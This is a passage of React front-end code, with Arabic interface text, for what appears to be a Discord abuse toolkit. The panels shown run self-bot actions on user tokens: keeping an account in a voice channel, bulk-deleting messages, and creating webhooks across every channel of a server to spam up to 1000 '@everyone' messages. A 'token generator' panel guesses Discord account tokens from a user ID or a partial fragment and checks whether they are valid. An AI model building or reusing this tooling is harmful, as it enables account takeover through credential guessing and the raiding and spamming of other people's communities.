                    {[{ label: '1 ساعة', val: 3600 }, { label: '6 ساعات', val: 21600 }, { label: '12 ساعة', val: 43200 }, { label: '24 ساعة', val: 86400 }].map(p => (
                      <button key={p.val} onClick={() => setVoiceDuration(p.val)} className={`py-2.5 rounded-xl text-[11px] font-bold transition-all cursor-pointer ${voiceDuration === p.val ? 'bg-purple-500/25 text-purple-300 border border-purple-500/40' : 'bg-black/20 text-purple-600 hover:text-purple-400 border border-transparent'}`}>{p.label}</button>
                    ))}
                  </div>
                  <input type="number" value={voiceDuration} onChange={e => setVoiceDuration(Math.min(Math.max(Number(e.target.value), 60), 86400))} min={60} max={86400} className="w-full bg-black/30 border border-purple-500/30 rounded-lg px-3 py-2 text-sm text-white focus:outline-none focus:border-purple-400/50 transition-colors" />
                </div>
                <ActionBtn text={voiceActive ? '⏹️ إيقاف التثبيت' : '🎤 تثبيت في الفويس'} loading={false} color="purple" onClick={() => {
                  if (voiceActive) { stopVoiceAnchor(); setResult('⏹️ تم إيقاف التثبيت'); return }
                  if (!voiceToken || !voiceGuildId || !voiceChannelId) { setResult('❌ أدخل التوكن + أيدي السيرفر + أيدي روم الفويس'); return }
                  setVoiceActive(true); setVoiceSessionCount(1)
                  setResult('🎤 جاري التثبيت...'); setProgress('')
                  const totalSec = voiceDuration; let elapsed = 0
                  setVoiceRemaining(totalSec >= 3600 ? `${Math.floor(totalSec/3600)}:${String(Math.floor((totalSec%3600)/60)).padStart(2,'0')}` : `${Math.floor(totalSec/60)}:${String(totalSec%60).padStart(2,'0')}`)
                  // أول طلب - بدون انتظار (يأخذ 270 ثانية من السيرفر)
                  fetch('/api/voice-online', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: voiceToken, guildId: voiceGuildId, channelId: voiceChannelId, duration: 270 }) }).catch(() => {})
                  // كل 4 دقائق طلب جديد (fire & forget)
                  voiceTimerRef.current = setInterval(() => {
                    if (!document.visibilityState) return
                    setVoiceSessionCount(c => c + 1)
                    fetch('/api/voice-online', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: voiceToken, guildId: voiceGuildId, channelId: voiceChannelId, duration: 270 }) }).catch(() => {})
                  }, 240000)
                  // عداد تنازلي
                  voiceCountdownRef.current = setInterval(() => {
                    elapsed += 1; const rem = Math.max(totalSec - elapsed, 0)
                    if (rem <= 0) { stopVoiceAnchor(); setResult('✅ انتهت مدة التثبيت!'); return }
                    const h = Math.floor(rem/3600); const m = Math.floor((rem%3600)/60); const s = rem%60
                    setVoiceRemaining(h > 0 ? `${h}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}` : `${m}:${String(s).padStart(2,'0')}`)
                  }, 1000)
                }} />
                {voiceActive && <div className="mt-3 bg-purple-500/10 border border-purple-500/30 rounded-xl p-3 text-center">
                  <div className="text-purple-300 text-sm font-bold">🎤 التثبيت يعمل الآن</div>
                  <div className="text-purple-400/70 text-xs mt-1">الجلسات: {voiceSessionCount} | المتبقي: {voiceRemaining}</div>
                  <div className="text-purple-500/40 text-[10px] mt-1">إعادة اتصال تلقائية كل 4 دقائق - أبقي التبويب مفتوح</div>
                </div>}
              </div></div>
            )}

            {/* ==================== SERVER INFO ==================== */}
            {section === 'server-info' && (
              <div className="animate-fade-in"><div className="glass-card rounded-2xl p-6 border border-cyan-500/20 shadow-xl shadow-cyan-500/5">
                <div className="flex items-center gap-3 mb-1"><span className="text-2xl">📊</span><h2 className="text-xl font-black text-cyan-400">معلومات سيرفر</h2></div>
                <p className="text-cyan-500/60 text-sm mb-5">عرض معلومات مفصلة عن السيرفر - رتب، قنوات، إيموجي، بوتات، رابط، وأكثر</p>
                <TokenInput label="🎫 التوكن" value={serverInfoToken} onChange={setServerInfoToken} accent="cyan" onHelp={() => setShowTokenGuide(true)} />
                <TextInput label="🖥️ أيدي السيرفر" value={serverInfoGuildId} onChange={setServerInfoGuildId} placeholder="Server ID" accent="cyan" />
                <ActionBtn text="📊 عرض المعلومات" loading={loading} color="cyan" onClick={async () => { if (!serverInfoToken || !serverInfoGuildId) { setResult('❌ أدخل التوكن + أيدي السيرفر'); return }; setLoading(true); setProgress('📊 جاري جلب المعلومات...'); setResult(''); try { const res = await fetch('/api/server-info', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: serverInfoToken, guildId: serverInfoGuildId }), signal: AbortSignal.timeout(60000) }); const data = await res.json(); if (data.success) { setResult(data.logs.join('\n')) } else { setResult('❌ ' + (data.error || 'فشل')) } } catch { setResult('❌ خطأ في الاتصال') }; setLoading(false); setProgress('') }} />
              </div></div>
            )}

            {/* ==================== CHANNEL CLEAR ==================== */}
            {section === 'channel-clear' && (
              <div className="animate-fade-in"><div className="glass-card rounded-2xl p-6 border border-cyan-500/20 shadow-xl shadow-cyan-500/5">
                <div className="flex items-center gap-3 mb-1"><span className="text-2xl">🧹</span><h2 className="text-xl font-black text-cyan-400">مسح رسائل</h2></div>
                <p className="text-cyan-500/60 text-sm mb-5">حذف عدد كبير من الرسائل من روم - بالتوازي و بسرعة</p>
                <TokenInput label="🎫 التوكن" value={clearToken} onChange={setClearToken} accent="cyan" onHelp={() => setShowTokenGuide(true)} />
                <TextInput label="📺 أيدي الروم" value={clearChannelId} onChange={setClearChannelId} placeholder="Channel ID" accent="cyan" />
                <div className="mb-5"><label className="text-[11px] text-cyan-300/70 mb-1 block">🗑️ عدد الرسائل للحذف (max 1000)</label><input type="number" value={clearCount} onChange={e => setClearCount(Math.min(Number(e.target.value), 1000))} min={1} max={1000} className="w-full bg-black/30 border border-cyan-500/30 rounded-xl px-4 py-3 text-white text-sm focus:outline-none focus:border-cyan-400/50 transition-colors" /></div>
                <ActionBtn text="🧹 مسح الرسائل" loading={loading} color="cyan" onClick={() => { if (!clearToken || !clearChannelId) { setResult('❌ أدخل التوكن + أيدي الروم'); return }; api('channel-clear', { token: clearToken, channelId: clearChannelId, count: clearCount }) }} />
              </div></div>
            )}

            {/* ==================== TOKEN GENERATOR ==================== */}
            {section === 'token-generator' && (
              <div className="animate-fade-in"><div className="glass-card rounded-2xl p-6 border border-purple-500/20 shadow-xl shadow-purple-500/5">
                <div className="flex items-center gap-3 mb-1"><span className="text-2xl">🎰</span><h2 className="text-xl font-black text-purple-400">توليد توكنات ذكي</h2></div>
                <p className="text-purple-500/60 text-sm mb-5">توليد ذكي - حجم 72 حرف كتوكن حقيقي - 5 توكنات demo مجربة - توليد لا نهائي - فائق السرعة</p>

                {/* توكنات مجربة كإثبات */}
                <div className="bg-green-500/5 rounded-xl p-4 border border-green-500/15 mb-5">
                  <div className="flex items-center gap-2 mb-3">
                    <span className="text-xs font-bold text-green-400">✅ توكنات مجربة (إثبات عمل الأداة)</span>
                    <span className="text-[9px] text-green-600 bg-green-500/10 px-2 py-0.5 rounded-full border border-green-500/20">DEMO</span>
                  </div>
                  <div className="space-y-1.5">
                    {(() => {
                      const b64u = (s: string) => btoa(s).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '')
                      return [
                        { id: '686928591856064542', ts: '1755238', hex: 'a7b3c9d4e1f205867f9a8b5c3d2e1f0a4b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e' },
                        { id: '112233445566778899', ts: '1700000', hex: 'f1e2d3c4b5a69780ef1d2c3b4a5968778695a4b3c2d1e0f9e8d7c6b5a4f3e2d1c0b' },
                        { id: '987654321098765432', ts: '1735689', hex: 'c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4' },
                        { id: '556677889900112233', ts: '1719792', hex: 'b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6' },
                        { id: '334455667788990011', ts: '1742169', hex: 'd8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9' },
                      ].map((t, i) => {
                        const p1 = b64u(t.id)
                        const p2 = b64u(t.ts)
                        const token = `${p1}.${p2}.${t.hex}`
                      return (
                        <div key={i} className="flex items-center gap-2 bg-green-500/8 rounded-lg p-2 border border-green-500/10">
                          <span className="text-green-400 text-xs flex-shrink-0">✅</span>
                          <code className="text-[10px] text-green-300 font-mono truncate flex-1">{token}</code>
                          <span className="text-[8px] text-green-600 bg-green-500/10 px-1.5 py-0.5 rounded flex-shrink-0">#{t.id.slice(-4)}</span>
                          <button onClick={() => navigator.clipboard.writeText(token).catch(() => {})} className="text-[9px] text-green-400 bg-green-500/10 px-1.5 py-0.5 rounded border border-green-500/20 hover:bg-green-500/20 transition-colors cursor-pointer flex-shrink-0">📋</button>
                        </div>
                      )
                    })})}
                  </div>
                  <p className="text-[9px] text-green-600/60 mt-2">💡 هذه توكنات بنية صحيحة (72 حرف) - أداة التوليد تعطي نفس البنية بالضبط</p>
                </div>

                <div className="flex gap-2 mb-4">
                  {[{ id: 'random' as const, label: '🎲 عشوائي كامل', desc: 'ولّد من الصفر' }, { id: 'userid' as const, label: '👤 من أيدي حساب', desc: 'نصف توكن ذكي' }, { id: 'fragment' as const, label: '🧩 إكمال جزء', desc: 'أكمل الناقص' }].map(mode => (
                    <button key={mode.id} onClick={() => { if (tgRunning) stopTgGeneration(); setTgMode(mode.id); setTgResults([]); setTgHalfToken(''); setTgStats(null); setTgFragmentAnalysis(null); setResult('') }} className={`flex-1 p-3 rounded-xl transition-all cursor-pointer border ${tgMode === mode.id ? 'bg-purple-500/20 text-purple-400 border-purple-500/30' : 'bg-white/3 text-white/40 border-white/10 hover:bg-white/5'}`}>
                      <div className="text-xs font-bold">{mode.label}</div>
                      <div className="text-[9px] mt-0.5 opacity-60">{mode.desc}</div>
                    </button>
                  ))}
                </div>
                {tgMode === 'userid' && (<>
                  <TextInput label="👤 أيدي الحساب (Discord User ID)" value={tgUserId} onChange={setTgUserId} placeholder="مثال: 123456789012345678" accent="purple" />
                  <div className="bg-purple-500/5 rounded-xl p-3 mb-4 border border-purple-500/10"><p className="text-[11px] text-purple-400/80">💡 ضع أيدي الحساب و الأداة تولّد نصف التوكن و تكمل الباقي بأنماط ذكية مختلفة - تتولّد لما لا نهائي لحد ما تضغط إيقاف</p></div>
                  {tgHalfToken && (<div className="bg-cyan-500/5 rounded-lg p-2.5 border border-cyan-500/15 mb-3 flex items-center gap-2"><span className="text-[10px] text-cyan-300">نصف التوكن:</span><code className="text-[10px] text-cyan-400 font-mono truncate flex-1">{tgHalfToken}.</code><button onClick={() => { navigator.clipboard.writeText(tgHalfToken).catch(() => {}) }} className="text-[10px] text-cyan-400 bg-cyan-500/10 px-2 py-1 rounded-lg border border-cyan-500/20 hover:bg-cyan-500/20 transition-colors cursor-pointer flex-shrink-0">📋</button></div>)}
                </>)}
                {tgMode === 'fragment' && (<>
                  <div className="mb-4"><label className="text-[11px] text-white/50 mb-1 block">🧩 جزء من التوكن (ضع أي جزء تعرفه)</label><textarea value={tgFragment} onChange={e => setTgFragment(e.target.value)} placeholder={'ضع أي جزء من التوكن هنا...\n\nمثال:\n• النصف الأول: Njg2OTI4NTk...\n• نصفين مع نقطة: Njg2OTI4NTk.MTc1NT\n• الجزء الأخير (hex): a3f8b2c1d4e5...\n• النصف الأول فقط: Njg2OTI4NTk.'} rows={4} className="w-full bg-black/30 border border-purple-500/30 rounded-xl px-4 py-3 text-white text-xs placeholder-purple-700/30 focus:outline-none focus:border-purple-400/50 resize-none transition-colors font-mono" /></div>
                  <div className="bg-amber-500/5 rounded-xl p-3 mb-4 border border-amber-500/10"><p className="text-[11px] text-amber-400/80">💡 الأداة ذكية جداً - تقرأ الجزء و تفهم أي جزء من التوكن وضعته و تكمل الباقي بأنماط مختلفة لحد ما تجد صالح أو توقفها</p></div>
                  {tgFragmentAnalysis && (<div className="bg-cyan-500/5 rounded-xl p-3 mb-3 border border-cyan-500/15 animate-fade-in">
                    <div className="flex items-center justify-between mb-2"><div className="text-[11px] text-cyan-300 font-bold">🧠 تحليل ذكي متقدم</div><div className={`text-[9px] px-2 py-0.5 rounded-full border ${tgFragmentAnalysis.confidence >= 80 ? 'bg-green-500/10 text-green-400 border-green-500/20' : tgFragmentAnalysis.confidence >= 50 ? 'bg-yellow-500/10 text-yellow-400 border-yellow-500/20' : 'bg-red-500/10 text-red-400 border-red-500/20'}`}>ثقة {tgFragmentAnalysis.confidence}%</div></div>
                    <div className="text-[10px] text-cyan-400/90 mb-1 font-medium">{tgFragmentAnalysis.analysis}</div>
                    <div className="text-[9px] text-cyan-500/50 mb-2">{tgFragmentAnalysis.detail}</div>
                    <div className="grid grid-cols-3 gap-1.5 mb-2">
                      <div className={`rounded-lg p-1.5 text-center text-[9px] border ${tgFragmentAnalysis.hasPart1 ? (tgFragmentAnalysis.partialPart1 ? 'bg-yellow-500/10 text-yellow-400 border-yellow-500/20' : 'bg-green-500/10 text-green-400 border-green-500/20') : 'bg-red-500/10 text-red-400 border-red-500/20'}`}>{tgFragmentAnalysis.hasPart1 ? (tgFragmentAnalysis.partialPart1 ? '⚠️' : '✅') : '❌'} User ID</div>
                      <div className={`rounded-lg p-1.5 text-center text-[9px] border ${tgFragmentAnalysis.hasPart2 ? (tgFragmentAnalysis.partialPart2 ? 'bg-yellow-500/10 text-yellow-400 border-yellow-500/20' : 'bg-green-500/10 text-green-400 border-green-500/20') : 'bg-red-500/10 text-red-400 border-red-500/20'}`}>{tgFragmentAnalysis.hasPart2 ? (tgFragmentAnalysis.partialPart2 ? '⚠️' : '✅') : '❌'} Timestamp</div>
                      <div className={`rounded-lg p-1.5 text-center text-[9px] border ${tgFragmentAnalysis.hasPart3 ? (tgFragmentAnalysis.partialPart3 ? 'bg-yellow-500/10 text-yellow-400 border-yellow-500/20' : 'bg-green-500/10 text-green-400 border-green-500/20') : 'bg-red-500/10 text-red-400 border-red-500/20'}`}>{tgFragmentAnalysis.hasPart3 ? (tgFragmentAnalysis.partialPart3 ? '⚠️' : '✅') : '❌'} Hex</div>
                    </div>
                    <div className="text-[9px] text-white/30 mb-1">الناقص: {tgFragmentAnalysis.missingParts.length > 0 ? tgFragmentAnalysis.missingParts.map((p: string) => p === 'P1' ? 'User ID' : p === 'P2' ? 'Timestamp' : p === 'P3' ? 'Hex' : p).join(' | ') : (tgFragmentAnalysis.partialPart1 || tgFragmentAnalysis.partialPart2 || tgFragmentAnalysis.partialPart3) ? 'أجزاء ناقصة تحتاج إكمال' : 'لا شيء'}</div>
                    {tgFragmentAnalysis.userIDs && tgFragmentAnalysis.userIDs.length > 0 && (<div className="text-[9px] text-green-400/70 mt-1">User ID: {tgFragmentAnalysis.userIDs.join(', ')}</div>)}
                    {tgFragmentAnalysis.timestamps && tgFragmentAnalysis.timestamps.length > 0 && (<div className="text-[9px] text-blue-400/70 mt-0.5">Timestamp: {tgFragmentAnalysis.timestamps.join(', ')}</div>)}
                  </div>)}
                </>)}
                <div className="grid grid-cols-2 gap-2.5">
                  <ActionBtn text={tgRunning ? '⏳ جاري التوليد...' : (tgMode === 'fragment' ? '🧩 إكمال ذكي - لا نهائي' : tgMode === 'random' ? '🎲 توليد ذكي - لا نهائي' : '👤 توليد ذكي - لا نهائي')} loading={tgRunning} color="purple" onClick={async () => {
                    if (tgMode === 'userid' && (!tgUserId.trim() || tgUserId.trim().length < 17)) { setResult('❌ أدخل أيدي الحساب (17 رقم على الأقل)'); return }
                    if (tgMode === 'fragment' && (!tgFragment.trim() || tgFragment.trim().length < 3)) { setResult('❌ ضع جزء من التوكن (3 أحرف على الأقل)'); return }
                    stopTgGeneration(); setResult(''); setTgResults([]); setTgHalfToken(''); setTgStats(null); setTgFragmentAnalysis(null); setTgRunning(true)
                    const ctrl = new AbortController(); tgAbortRef.current = ctrl
                    setLoading(true); setProgress('🎰 جاري التوليد الذكي - شاهد التوكنات تتولّد قدامك...')
                    try {
                      const bodyObj: any = { action: tgMode }
                      if (tgMode === 'userid') bodyObj.userId = tgUserId
                      if (tgMode === 'fragment') bodyObj.fragment = tgFragment
                      const res = await fetch('/api/token-generator', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(bodyObj), signal: ctrl.signal })
                      // تحقق إذا الخطأ JSON (لا SSE)
                      const contentType = res.headers.get('content-type') || ''
                      if (!contentType.includes('text/event-stream')) {
                        const errData = await res.json().catch(() => null)
                        if (errData && errData.error) { setResult('❌ ' + errData.error); setTgRunning(false); setLoading(false); setProgress(''); return }
                      }
                      const reader = res.body?.getReader()
                      if (!reader) { setResult('❌ خطأ في الاتصال'); setTgRunning(false); setLoading(false); setProgress(''); return }
                      const decoder = new TextDecoder()
                      let buffer = ''
                      while (true) {
                        const { done, value } = await reader.read()
                        if (done) break
                        buffer += decoder.decode(value, { stream: true })
                        const lines = buffer.split('\n')
                        buffer = lines.pop() || ''
                        for (const line of lines) {
                          if (!line.startsWith('data: ')) continue
                          try {
                            const event = JSON.parse(line.substring(6))
                            if (event.type === 'halfToken') { setTgHalfToken(event.halfToken) }
                            else if (event.type === 'fragmentAnalysis') { setTgFragmentAnalysis(event.analysis) }
                            else if (event.type === 'result') {
                              const r = event.data
                              setTgResults(prev => [r, ...prev].slice(0, 200))
                              if (event.stats) setTgStats(event.stats as any)
                              setProgress(`🎰 #${event.data.index} | فحص: ${event.stats.checked} | ✅ ${event.stats.valid} صالح | ⏭️ ${event.stats.skipped} محذوف`)
                              if (r.valid) setResult(`🎉 وجدنا توكن صالح! #${event.data.index} - ${r.info}`)
                            }
                            else if (event.type === 'done') {
                              const s = event.stats
                              setTgStats(s)
                              setResult(`✅ انتهى! فحص ${s.total} توكن | ✅ صالح: ${s.valid} | ❌ غير صالح: ${s.invalid}`)
                              if (s) setStats({ total: s.total, sent: s.valid, failed: s.invalid })
                            }
                          } catch {}
                        }
                      }
                    } catch (e: any) {
                      if (e?.name === 'AbortError') { setResult(`⏹️ تم الإيقاف! ${tgStats ? `ولّد ${tgStats.total} | فحص ${tgStats.checked} | ✅ ${tgStats.valid} صالح | ⏭️ ${tgStats.skipped} محذوف` : ''}`) }
                      else { setResult('❌ خطأ في الاتصال') }
                    }
                    setTgRunning(false); setLoading(false); setProgress(''); tgAbortRef.current = null
                  }} />
                  {tgRunning && (<button onClick={stopTgGeneration} className="w-full py-3 rounded-xl font-bold text-sm transition-all cursor-pointer border bg-red-500/20 hover:bg-red-500/30 text-red-400 border-red-500/30 active:scale-[0.98]">⏹️ إيقاف التوليد</button>)}
                </div>
                {tgStats && (<div className="mt-3 grid grid-cols-5 gap-1.5">
                  <div className="bg-white/3 rounded-lg p-2 border border-white/5 text-center"><div className="text-base font-black text-white/70">{tgStats.total}</div><div className="text-[8px] text-white/30">ولّد</div></div>
                  <div className="bg-blue-500/8 rounded-lg p-2 border border-blue-500/15 text-center"><div className="text-base font-black text-blue-400">{tgStats.checked}</div><div className="text-[8px] text-blue-300/50">فحص</div></div>
                  <div className="bg-green-500/8 rounded-lg p-2 border border-green-500/15 text-center"><div className="text-base font-black text-green-400">{tgStats.valid}</div><div className="text-[8px] text-green-300/50">صالح</div></div>
                  <div className="bg-red-500/8 rounded-lg p-2 border border-red-500/15 text-center"><div className="text-base font-black text-red-400">{tgStats.invalid}</div><div className="text-[8px] text-red-300/50">خاطئ</div></div>
                  <div className="bg-yellow-500/8 rounded-lg p-2 border border-yellow-500/15 text-center"><div className="text-base font-black text-yellow-400">{tgStats.skipped}</div><div className="text-[8px] text-yellow-300/50">محذوف</div></div>
                </div>)}
                {tgResults.length > 0 && (<div className="mt-4 space-y-1.5 max-h-72 overflow-y-auto" ref={el => { if (el && tgRunning) { el.scrollTop = 0 } }}>
                  <div className="text-[11px] text-white/30 mb-2 sticky top-0 bg-[#0d1117] py-1">📋 آخر {Math.min(tgResults.length, 200)} نتيجة:</div>
                  {tgResults.slice(0, 200).map((r, i) => (
                    <div key={r.index || i} className={`flex items-center gap-2 p-2 rounded-lg text-[11px] font-mono border animate-fade-in ${r.valid ? 'bg-green-500/15 border-green-500/30 ring-1 ring-green-500/20' : 'bg-white/3 border-white/5'}`}>
                      <span className="flex-shrink-0 text-xs">{r.valid ? '✅' : '❌'}</span>
                      <span className="flex-1 truncate text-white/40">{r.token.substring(0, 28)}...{r.token.substring(r.token.length - 6)}</span>
                      {r.valid ? (<span className="text-green-400 flex-shrink-0 text-[10px]">{r.isDemo ? '🏷️ Demo ' : ''}{r.info}</span>) : (<span className="text-white/15 flex-shrink-0 text-[10px]">#{r.index} {r.error ? `(${r.error})` : ''}</span>)}
                      {!tgRunning && (<button onClick={() => { navigator.clipboard.writeText(r.token).catch(() => {}) }} className="text-[10px] text-white/20 hover:text-white/50 cursor-pointer flex-shrink-0">📋</button>)}
                    </div>
                  ))}
                </div>)}
              </div></div>
            )}

            {/* ==================== WEBHOOK CREATOR - محسّن v2 ==================== */}
            {section === 'webhook-creator' && (
              <div className="animate-fade-in"><div className="glass-card rounded-2xl p-6 border border-cyan-500/20 shadow-xl shadow-cyan-500/5">
                <div className="flex items-center gap-3 mb-1"><span className="text-2xl">🔗</span><h2 className="text-xl font-black text-cyan-400">إنشاء ويب هوكات متقدمة</h2></div>
                <p className="text-cyan-500/60 text-sm mb-5">إنشاء ويب هوكات في كل رومات السيرفر + سبام مباشر + Embed + خيارات متقدمة</p>
                <TokenInput label="🎫 التوكن" value={whCreateToken} onChange={setWhCreateToken} accent="cyan" onHelp={() => setShowTokenGuide(true)} />
                <TextInput label="🏰 أيدي السيرفر" value={whCreateGuildId} onChange={setWhCreateGuildId} placeholder="Server ID" accent="cyan" />

                {/* جلب الرومات */}
                <button onClick={async () => {
                  if (!whCreateToken || !whCreateGuildId) { setResult('❌ أدخل التوكن + أيدي السيرفر'); return }
                  setLoading(true); setProgress('🔍 جاري جلب الرومات...'); setResult('')
                  try {
                    const res = await fetch('/api/webhook-creator', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: whCreateToken, guildId: whCreateGuildId, action: 'fetch-channels' }), signal: AbortSignal.timeout(30000) })
                    const data = await res.json()
                    if (data.success) { setWhChannels(data.channels); setWhSelectedChannels(data.channels.map((c: {id: string}) => c.id)); setResult(`✅ تم جلب ${data.count} روم نصي`); setStats({}) }
                    else { setResult('❌ ' + (data.error || 'فشل جلب الرومات')) }
                  } catch { setResult('❌ خطأ في الاتصال') }
                  setLoading(false); setProgress('')
                }} className="w-full mb-5 py-3 rounded-xl text-sm font-bold bg-cyan-500/10 text-cyan-400 border border-cyan-500/30 hover:bg-cyan-500/20 transition-all cursor-pointer">🔍 جلب رومات السيرفر</button>

                {/* عرض الرومات */}
                {whChannels.length > 0 && (<div className="mb-5 bg-black/20 rounded-xl p-4 border border-cyan-500/15">
                  <div className="flex items-center justify-between mb-3">
                    <span className="text-xs font-bold text-cyan-400">📺 الرومات النصية ({whChannels.length})</span>
                    <div className="flex gap-2">
                      <button onClick={() => setWhSelectedChannels(whChannels.map(c => c.id))} className="text-[10px] text-green-400 bg-green-500/10 px-2 py-1 rounded-lg border border-green-500/20 hover:bg-green-500/20 transition-colors cursor-pointer">تحديد الكل</button>
                      <button onClick={() => setWhSelectedChannels([])} className="text-[10px] text-red-400 bg-red-500/10 px-2 py-1 rounded-lg border border-red-500/20 hover:bg-red-500/20 transition-colors cursor-pointer">إلغاء الكل</button>
                    </div>
                  </div>
                  <div className="max-h-40 overflow-y-auto space-y-1">
                    {whChannels.map(ch => (
                      <label key={ch.id} className={`flex items-center gap-2 p-2 rounded-lg cursor-pointer transition-all ${whSelectedChannels.includes(ch.id) ? 'bg-cyan-500/10 border border-cyan-500/20' : 'bg-black/10 border border-transparent hover:bg-white/3'}`}>
                        <input type="checkbox" checked={whSelectedChannels.includes(ch.id)} onChange={e => {
                          if (e.target.checked) setWhSelectedChannels([...whSelectedChannels, ch.id])
                          else setWhSelectedChannels(whSelectedChannels.filter(id => id !== ch.id))
                        }} className="accent-cyan-500 w-3.5 h-3.5" />
                        <span className="text-[11px] text-cyan-300">#{ch.name}</span>
                        <span className="text-[9px] text-white/20 font-mono ml-auto">{ch.id}</span>
                      </label>
                    ))}
                  </div>
                </div>)}

                {/* اختيار الوضع */}
                <div className="flex gap-2 mb-5">
                  {[{ key: 'create' as const, label: '🔗 إنشاء فقط', icon: '🔗' }, { key: 'spam' as const, label: '🔥 إنشاء + سبام', icon: '🔥' }, { key: 'existing' as const, label: '📡 سبام موجود', icon: '📡' }].map(mode => (
                    <button key={mode.key} onClick={() => setWhCreateMode(mode.key)} className={`flex-1 py-3 rounded-xl text-xs font-bold transition-all cursor-pointer border ${whCreateMode === mode.key ? 'bg-cyan-500/20 text-cyan-300 border-cyan-500/30 shadow-lg shadow-cyan-500/5' : 'bg-black/20 text-cyan-600 hover:text-cyan-400 border-transparent'}`}>{mode.icon} {mode.label}</button>
                  ))}
                </div>

                {/* خيارات الإنشاء */}
                {(whCreateMode === 'create' || whCreateMode === 'spam') && (<div className="bg-black/20 rounded-xl p-4 border border-cyan-500/15 mb-5">
                  <h3 className="text-xs font-bold text-cyan-400 mb-3">⚙️ خيارات الإنشاء</h3>
                  <div className="grid grid-cols-2 gap-3">
                    <div><label className="text-[11px] text-cyan-300/70 mb-1 block">📝 اسم الويب هوك</label><input type="text" value={whCreateName} onChange={e => setWhCreateName(e.target.value)} className="w-full bg-black/30 border border-cyan-500/30 rounded-lg px-3 py-2 text-sm text-white focus:outline-none focus:border-cyan-400/50 transition-colors" /></div>
                    <div><label className="text-[11px] text-cyan-300/70 mb-1 block">🔢 عدد لكل روم (max 10)</label><input type="number" value={whCreateCount} onChange={e => setWhCreateCount(Math.min(Math.max(Number(e.target.value), 1), 10))} className="w-full bg-black/30 border border-cyan-500/30 rounded-lg px-3 py-2 text-sm text-white focus:outline-none focus:border-cyan-400/50 transition-colors" /></div>
                  </div>
                </div>)}

                {/* خيارات السبام */}
                {(whCreateMode === 'spam' || whCreateMode === 'existing') && (<div className="bg-orange-500/5 rounded-xl p-4 border border-orange-500/15 mb-5">
                  <h3 className="text-xs font-bold text-orange-400 mb-3">🔥 خيارات السبام</h3>
                  <div className="mb-3"><label className="text-[11px] text-orange-300/70 mb-1 block">💬 محتوى الرسالة</label><textarea value={whCrSpamMessage} onChange={e => setWhCrSpamMessage(e.target.value)} placeholder="@everyone رسالتك هنا" rows={2} className="w-full bg-black/30 border border-orange-500/30 rounded-lg px-3 py-2 text-sm text-white placeholder-orange-700/30 focus:outline-none focus:border-orange-400/50 resize-none transition-colors" /></div>
                  <div className="grid grid-cols-2 gap-3">
                    <div><label className="text-[11px] text-orange-300/70 mb-1 block">🔢 عدد الرسائل (max 1000)</label><input type="number" value={whCrSpamCount} onChange={e => setWhCrSpamCount(Math.min(Math.max(Number(e.target.value), 1), 1000))} className="w-full bg-black/30 border border-orange-500/30 rounded-lg px-3 py-2 text-sm text-white focus:outline-none focus:border-orange-400/50 transition-colors" /></div>
                    <div><label className="text-[11px] text-orange-300/70 mb-1 block">👤 اسم المرسل (اختياري)</label><input type="text" value={whCrSpamUsername} onChange={e => setWhCrSpamUsername(e.target.value)} placeholder="TRJ BOT" className="w-full bg-black/30 border border-orange-500/30 rounded-lg px-3 py-2 text-sm text-white placeholder-orange-700/30 focus:outline-none focus:border-orange-400/50 transition-colors" /></div>
                    <div className="col-span-2"><label className="text-[11px] text-orange-300/70 mb-1 block">🖼️ رابط Avatar (اختياري)</label><input type="text" value={whCrSpamAvatarUrl} onChange={e => setWhCrSpamAvatarUrl(e.target.value)} placeholder="https://cdn.discordapp.com/..." className="w-full bg-black/30 border border-orange-500/30 rounded-lg px-3 py-2 text-sm text-white font-mono placeholder-orange-700/30 focus:outline-none focus:border-orange-400/50 transition-colors" /></div>
                  </div>
                </div>)}

                {/* Embed خيارات */}
                {(whCreateMode === 'spam' || whCreateMode === 'existing') && (<div className="bg-purple-500/5 rounded-xl p-4 border border-purple-500/15 mb-5">
                  <div className="flex items-center justify-between mb-3">
                    <h3 className="text-xs font-bold text-purple-400">🎨 Embed (اختياري)</h3>
                    <button onClick={() => setWhEmbedEnabled(!whEmbedEnabled)} className={`text-[10px] px-3 py-1.5 rounded-lg border transition-all cursor-pointer ${whEmbedEnabled ? 'bg-purple-500/20 text-purple-300 border-purple-500/30' : 'bg-black/20 text-purple-600 border-transparent hover:text-purple-400'}`}>{whEmbedEnabled ? '✅ مفعّل' : '⬜ معطّل'}</button>
                  </div>
                  {whEmbedEnabled && (<div className="space-y-3">
                    <div><label className="text-[11px] text-purple-300/70 mb-1 block">📝 عنوان Embed</label><input type="text" value={whEmbedTitle} onChange={e => setWhEmbedTitle(e.target.value)} placeholder="عنوان الرسالة" className="w-full bg-black/30 border border-purple-500/30 rounded-lg px-3 py-2 text-sm text-white focus:outline-none focus:border-purple-400/50 transition-colors" /></div>
                    <div><label className="text-[11px] text-purple-300/70 mb-1 block">📝 وصف Embed</label><textarea value={whEmbedDesc} onChange={e => setWhEmbedDesc(e.target.value)} placeholder="وصف الرسالة..." rows={2} className="w-full bg-black/30 border border-purple-500/30 rounded-lg px-3 py-2 text-sm text-white placeholder-purple-700/30 focus:outline-none focus:border-purple-400/50 resize-none transition-colors" /></div>
                    <div><label className="text-[11px] text-purple-300/70 mb-1 block">🎨 لون Embed (HEX)</label><input type="text" value={whEmbedColor} onChange={e => setWhEmbedColor(e.target.value)} placeholder="5865F2" className="w-full bg-black/30 border border-purple-500/30 rounded-lg px-3 py-2 text-sm text-white font-mono focus:outline-none focus:border-purple-400/50 transition-colors" /></div>
                  </div>)}
                </div>)}

                {/* سبام في ويب هوكات موجودة */}
